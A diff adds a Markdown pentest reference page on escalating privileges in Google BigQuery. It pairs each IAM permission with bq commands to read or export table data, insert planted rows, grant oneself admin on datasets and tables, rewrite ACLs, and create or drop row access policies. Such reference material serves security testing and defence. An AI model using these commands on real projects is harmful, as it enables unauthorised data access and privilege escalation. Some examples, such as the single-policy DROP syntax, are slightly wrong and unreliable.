@@ -1,0 +1,153 @@
+# GCP - BigQuery Privesc
+
+## BigQuery
+
+For more information about BigQuery check:
+
+### Read Table
+
+Reading the information stored inside the a BigQuery table it might be possible to find s**ensitive information**. To access the info the permission needed is **`bigquery.tables.get`** , **`bigquery.jobs.create`** and **`bigquery.tables.getData`**:
+
+<details>
+<summary>Read BigQuery table data</summary>
+
+```bash
+bq head <dataset>.<table>
+bq query --nouse_legacy_sql 'SELECT * FROM `<proj>.<dataset>.<table-name>` LIMIT 1000'
+```
+
+</details>
+
+### Export data
+
+This is another way to access the data. **Export it to a cloud storage bucket** and the **download the files** with the information.\
+To perform this action the following permissions are needed: **`bigquery.tables.export`**, **`bigquery.jobs.create`** and **`storage.objects.create`**.
+
+<details>
+<summary>Export BigQuery table to Cloud Storage</summary>
+
+```bash
+bq extract <dataset>.<table> "gs://<bucket>/table*.csv"
+```
+
+</details>
+
+### Insert data
+
+It might be possible to **introduce certain trusted data** in a Bigquery table to abuse a **vulnerability in some other place.** This can be easily done with the permissions **`bigquery.tables.get`** , **`bigquery.tables.updateData`** and **`bigquery.jobs.create`**:
+
+<details>
+<summary>Insert data into BigQuery table</summary>
+
+```bash
+# Via query
+bq query --nouse_legacy_sql 'INSERT INTO `<proj>.<dataset>.<table-name>` (rank, refresh_date, dma_name, dma_id, term, week, score) VALUES (22, "2023-12-28", "Baltimore MD", 512, "Ms", "2019-10-13", 62), (22, "2023-12-28", "Baltimore MD", 512, "Ms", "2020-05-24", 67)'
+
+# Via insert param
+bq insert dataset.table /tmp/mydata.json
+```
+
+</details>
+
+### `bigquery.datasets.setIamPolicy`
+
+An attacker could abuse this privilege to **give himself further permissions** over a BigQuery dataset:
+
+<details>
+<summary>Set IAM policy on BigQuery dataset</summary>
+
+```bash
+# For this you also need bigquery.tables.getIamPolicy
+bq add-iam-policy-binding \
+    --member='user:<email>' \
+    --role='roles/bigquery.admin' \
+    <proj>:<dataset>
+
+# use the set-iam-policy if you don't have bigquery.tables.getIamPolicy
+```
+
+</details>
+
+### `bigquery.datasets.update`, (`bigquery.datasets.get`)
+
+Just this permission allows to **update your access over a BigQuery dataset by modifying the ACLs** that indicate who can access it:
+
+<details>
+<summary>Update BigQuery dataset ACLs</summary>
+
+```bash
+# Download current permissions, reqires bigquery.datasets.get
+bq show --format=prettyjson <proj>:<dataset> > acl.json
+## Give permissions to the desired user
+bq update --source acl.json <proj>:<dataset>
+## Read it with
+bq head $PROJECT_ID:<dataset>.<table>
+```
+
+</details>
+
+### `bigquery.tables.setIamPolicy`
+
+An attacker could abuse this privilege to **give himself further permissions** over a BigQuery table:
+
+<details>
+<summary>Set IAM policy on BigQuery table</summary>
+
+```bash
+# For this you also need bigquery.tables.setIamPolicy
+bq add-iam-policy-binding \
+    --member='user:<email>' \
+    --role='roles/bigquery.admin' \
+    <proj>:<dataset>.<table>
+
+# use the set-iam-policy if you don't have bigquery.tables.setIamPolicy
+```
+
+</details>
+
+### `bigquery.rowAccessPolicies.update`, `bigquery.rowAccessPolicies.setIamPolicy`, `bigquery.tables.getData`, `bigquery.jobs.create`
+
+According to the docs, with the mention permissions it's possible to **update a row policy.**\
+However, **using the cli `bq`** you need some more: **`bigquery.rowAccessPolicies.create`**, **`bigquery.tables.get`**.
+
+<details>
+<summary>Create or replace row access policy</summary>
+
+```bash
+bq query --nouse_legacy_sql 'CREATE OR REPLACE ROW ACCESS POLICY <filter_id> ON `<proj>.<dataset-name>.<table-name>` GRANT TO ("<user:user@email.xyz>") FILTER USING (term = "Cfba");' # A example filter was used
+```
+
+</details>
+
+It's possible to find the filter ID in the output of the row policies enumeration. Example:
+
+<details>
+<summary>List row access policies</summary>
+
+```bash
+ bq ls --row_access_policies <proj>:<dataset>.<table>
+
+      Id        Filter Predicate            Grantees              Creation Time    Last Modified Time
+ ------------- ------------------ ----------------------------- ----------------- --------------------
+  apac_filter   term = "Cfba"      user:asd@hacktricks.xyz   21 Jan 23:32:09   21 Jan 23:32:09
+```
+
+</details>
+
+If you have **`bigquery.rowAccessPolicies.delete`** instead of `bigquery.rowAccessPolicies.update` you could also just delete the policy:
+
+<details>
+<summary>Delete row access policies</summary>
+
+```bash
+# Remove one
+bq query --nouse_legacy_sql 'DROP ALL ROW ACCESS POLICY <policy_id> ON `<proj>.<dataset-name>.<table-name>`;'
+
+# Remove all (if it's the last row policy you need to use this
+bq query --nouse_legacy_sql 'DROP ALL ROW ACCESS POLICIES ON `<proj>.<dataset-name>.<table-name>`;'
+```
+
+</details>
+
+> [!CAUTION]
+> Another potential option to bypass row access policies would be to just change the value of the restricted data. If you can only see when `term` is `Cfba`, just modify all the records of the table to have `term = "Cfba"`. However this is prevented by bigquery.
